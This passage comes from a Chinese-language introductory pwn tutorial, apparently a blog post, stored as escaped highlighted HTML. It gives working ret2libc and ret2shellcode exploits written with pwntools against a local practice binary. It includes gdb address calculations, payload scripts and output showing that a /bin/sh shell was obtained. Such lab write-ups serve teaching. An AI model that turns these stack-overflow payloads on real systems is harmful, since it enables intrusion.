&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;I&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">gdb&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./question32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">b question.c:13
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">continue
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>观察程序的 epilogue 部分，&lt;code>main()&lt;/code> 在 prologue 部分保存了 &lt;code>%ecx&lt;/code>、&lt;code>%edi&lt;/code>、&lt;code>%ebx&lt;/code> 寄存器的值，在清栈阶段会恢复这些寄存器。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> leal -12(%ebp), %esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> popl %ecx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> popl %ebx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> popl %edi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> popl %ebp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> leal -4(%ecx), %esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>需要注意的是 &lt;code>%ecx&lt;/code> 寄存器的值会被用作 &lt;code>%esp&lt;/code> ，而我们覆写返回地址必然导致 &lt;code>%ecx&lt;/code> 寄存器的值被覆写，所以需要提前算好 &lt;code>leal -4(%ecx), %esp&lt;/code> 指令执行后 &lt;code>%esp&lt;/code> 指向的位置，让 &lt;code>%esp&lt;/code> 刚好指向我们期望的 &lt;code>system&lt;/code> 函数地址。&lt;/p>
&lt;p>脚本启动 gdb 后先计算下 &lt;code>&amp;amp;buffer&lt;/code> 到 &lt;code>movl -12(%ebp), %esp&lt;/code> 这条指令后的 &lt;code>%esp&lt;/code> 的距离，也就是从&lt;code>buffer&lt;/code>一路写到栈上保存的 &lt;code>%ecx&lt;/code> 前所需填充的长度。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">gdb-peda$ p &amp;amp;buffer
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$1 = (char (*)[100]) 0xffffd0dc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gdb-peda$ distance 0xffffd0dc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">From 0xffffd14c (SP) to 0xffffd0dc: -112 bytes, -28 dwords
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gdb-peda$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>得到长度后简单计算下 &lt;code>&amp;amp;buffer(0xffffd0dc) + padding_size(112) + register(4) * 4&lt;/code> 等于 &lt;code>0xffffd1bc&lt;/code>，这个地址就是我们溢出后覆写的返回地址所在位置，这个地址加上 4 就是 &lt;code>%ecx&lt;/code> 的取值了。&lt;/p>
&lt;p>最后获取 &lt;code>system&lt;/code> 函数的地址和 &lt;code>name&lt;/code> 的地址，作为 &lt;code>system&lt;/code> 函数的返回地址我们再获取一下 &lt;code>exit&lt;/code> 函数的地址。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">gdb-peda$ p &amp;amp;system
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$1 = (&amp;lt;text variable, no debug info&amp;gt; *) 0xf7dcbcb0 &amp;lt;system&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gdb-peda$ p &amp;amp;name
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$2 = (char (*)[100]) 0x804c060 &amp;lt;name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gdb-peda$ p &amp;amp;exit
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$3 = (&amp;lt;text variable, no debug info&amp;gt; *) 0xf7dbe1c0 &amp;lt;exit&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gdb-peda$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>综合这些元素组装一个 payload 。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">gdb&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">gdb&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./question32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">b question.c:13
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">continue
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x42&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">112&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># %ecx, %ebx, %edi, %ebp, &amp;amp;system, &amp;amp;exit, &amp;amp;name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stack_elem&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mh">0xffffd1c0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xf7dcbcb0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xf7dbe1c0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x804c060&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;IIIIIII&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">stack_elem&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>启动调试，注意到执行到 &lt;code>ret&lt;/code> 时，&lt;code>%esp&lt;/code> 已经是 &lt;code>system&lt;/code> 的地址，并预先填充了 &lt;code>exit&lt;/code> 函数地址作为 &lt;code>system&lt;/code> 函数的返回地址，&lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> 字符串的指针作为 &lt;code>system&lt;/code> 函数的参数。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161537813.png"
width="983"
height="614"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161537813_hu99c27d78f9ce90295c36750c1d6b5b3e_618877_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161537813_hu99c27d78f9ce90295c36750c1d6b5b3e_618877_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220817161537813"
class="gallery-image"
data-flex-grow="160"
data-flex-basis="384px"
>&lt;/p>
&lt;p>继续执行。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161746120.png"
width="1920"
height="1040"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161746120_hu5696a5cba533ced68cff91d76d71e89a_1615602_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161746120_hu5696a5cba533ced68cff91d76d71e89a_1615602_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220817161746120"
class="gallery-image"
data-flex-grow="184"
data-flex-basis="443px"
>&lt;/p>
&lt;p>成功取得shell。现在我们把调试器去除，使用 &lt;code>pwn.process&lt;/code> 来启动程序。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">process&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./question32&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x42&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">112&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># %ecx, %ebx, %edi, %ebp, &amp;amp;system, &amp;amp;perror, &amp;amp;name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stack_elem&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mh">0xffffd1c0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xf7dcbcb0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xf7dbe1c0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x804c060&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;IIIIIII&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">stack_elem&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>结果：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-2 » python exp32.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Starting local process &amp;#39;./question32&amp;#39;: pid 146484
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Switching to interactive mode
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">name: 0x804c060 buffer: 0xffffd13c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">what&amp;#39;s your name?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome, /bin/sh. Show your hack skill.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ echo $0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>成功。&lt;/p>
&lt;h3 id="ret2shellcode">ret2shellcode&lt;/h3>
&lt;p>这是另一个例子，不同之处在于栈可执行保护没有开启（编译参数 &lt;code>-z execstack&lt;/code>）。其他和上例相同。&lt;/p>
&lt;p>pwntools 提供了一些 shellcode 片段，其中就有用系统调用 &lt;code>execve&lt;/code> 启动 &lt;code>/bin/sh&lt;/code> 的代码。在 &lt;code>ret2libc&lt;/code> 的 &lt;code>exploit&lt;/code> 基础上，我们只用把返回地址修改成 &lt;code>buffer&lt;/code> 的地址，把填充 &lt;code>buffer&lt;/code> 的 &lt;code>\x41&lt;/code> 换成 shellcode 即可。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">gdb&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">shellcraft&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">asm&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">gdb&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./question32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">b question.c:13
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">continue
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;hacker&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">asm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shellcraft&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">i386&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">linux&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sh&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x00&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># %ecx, %ebx, %edi, %ebp, &amp;amp;buffer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stack_elem&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mh">0xffffd1c0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xffffd13c&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;IIIII&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">stack_elem&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在调试器中观察，确认&lt;code>ret&lt;/code>跳转到了&lt;code>&amp;amp;buffer&lt;/code>，将脚本改为 &lt;code>pwn.process&lt;/code> 即可。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817170010162.png"
width="600"
height="258"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817170010162_hu5bebb33353747b29ee3be2f01684cdb4_85729_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817170010162_hu5bebb33353747b29ee3be2f01684cdb4_85729_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220817170010162"
class="gallery-image"
data-flex-grow="232"
data-flex-basis="558px"
>&lt;/p>
&lt;p>还可以看下 &lt;code>shellcraft.i386.linux.sh&lt;/code> 提供的代码片段长什么样。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
